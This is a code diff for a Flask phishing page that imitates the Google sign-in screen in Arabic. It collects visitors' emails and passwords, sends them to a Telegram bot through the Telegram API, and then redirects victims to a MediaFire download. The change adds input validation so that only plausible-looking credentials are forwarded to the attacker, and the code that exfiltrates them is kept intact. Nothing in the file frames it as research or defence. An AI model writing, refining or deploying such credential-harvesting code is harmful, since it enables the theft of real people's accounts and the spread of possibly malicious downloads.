@@ -1,4 +1,5 @@
 import os
+import re
 import requests
 from flask import Flask, redirect, render_template_string, request
 
@@ -16,23 +17,33 @@ MEDIAFIRE_URL = (
 
 @app.route("/", methods=["GET", "POST"])
 def login():
+  error = ""
   if request.method == "POST":
-    email = request.form.get("email")
-    password = request.form.get("password")
+    email = request.form.get("email", "").strip()
+    password = request.form.get("password", "")
 
-    # إرسال البيانات إلى بوت تيليجرام
-    if BOT_TOKEN and CHAT_ID:
-      msg = (
-          "📩 تم استلام بيانات جديدة:\n\n📧 البريد:"
-          f" {email}\n🔑 الباسورد: {password}"
-      )
-      telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-      requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})
+    # التحقق من صحة البريد الإلكتروني
+    email_pattern = r"^[\w\.-]+@[\w\.-]+\.\w+$"
+    if not re.match(email_pattern, email):
+      error = "الرجاء إدخال عنوان بريد إلكتروني صحيح (يحتوي على @ ونطاق صحيح)"
+    # التحقق من أن كلمة المرور أطول من 5 أحرف
+    elif len(password) <= 5:
+      error = "كلمة المرور يجب أن تكون أكثر من 5 أحرف!"
+    else:
+      # إرسال البيانات إلى بوت تيليجرام إذا طابقت الشروط
+      if BOT_TOKEN and CHAT_ID:
+        msg = (
+            "📩 تم استلام بيانات جديدة:\n\n📧 البريد:"
+            f" {email}\n🔑 الباسورد: {password}"
+        )
+        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})
 
-    # التوجيه لرابط التحميل
-    return redirect(MEDIAFIRE_URL)
+      # التوجيه لرابط التحميل
+      return redirect(MEDIAFIRE_URL)
 
-  return render_template_string("""
+  return render_template_string(
+      """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -43,10 +54,8 @@ def login():
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif; }
         body { background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; width: 100vw; padding: 0; margin: 0; }
         
-        /* تمديد الصفحة لتملأ الشاشة بالكامل على الهواتف */
         .google-card { background: #fff; width: 100%; height: 100vh; padding: 40px 25px; border: none; border-radius: 0; text-align: center; display: flex; flex-direction: column; justify-content: center; }
 
-        /* للشاشات الكبيرة (الكمبيوتر) تعود كبطاقة متوسطة في المنتصف */
         @media (min-width: 768px) {
             body { background: #f0f2f5; padding: 20px; }
             .google-card { height: auto; max-width: 450px; border: 1px solid #dadce0; border-radius: 8px; padding: 40px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
@@ -61,7 +70,9 @@ def login():
         .google-logo span:nth-child(6) { color: #EA4335; }
 
         h2 { color: #202124; font-size: 26px; font-weight: 400; margin-bottom: 8px; }
-        p { color: #5f6368; font-size: 16px; margin-bottom: 35px; }
+        p { color: #5f6368; font-size: 16px; margin-bottom: 25px; }
+
+        .error-msg { color: #d93025; background: #fce8e6; padding: 12px; border-radius: 4px; font-size: 14px; margin-bottom: 20px; text-align: right; border: 1px solid #fad2cf; }
 
         .input-group { margin-bottom: 20px; text-align: right; }
         .input-group input { width: 100%; padding: 16px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; transition: border 0.2s; background: transparent; }
@@ -78,9 +89,14 @@ def login():
         </div>
         <h2>تسجيل الدخول</h2>
         <p>استخدم حساب Google الخاص بك</p>
+        
+        {% if error %}
+            <div class="error-msg">{{ error }}</div>
+        {% endif %}
+
         <form method="POST">
             <div class="input-group">
-                <input type="text" name="email" required placeholder="البريد الإلكتروني أو الهاتف">
+                <input type="email" name="email" required placeholder="البريد الإلكتروني أو الهاتف" value="{{ request.form.get('email', '') }}">
             </div>
             <div class="input-group">
                 <input type="password" name="password" required placeholder="أدخل كلمة المرور">
@@ -90,7 +106,9 @@ def login():
     </div>
 </body>
 </html>
-""")
+""",
+      error=error,
+  )
 
 
 if __name__ == "__main__":
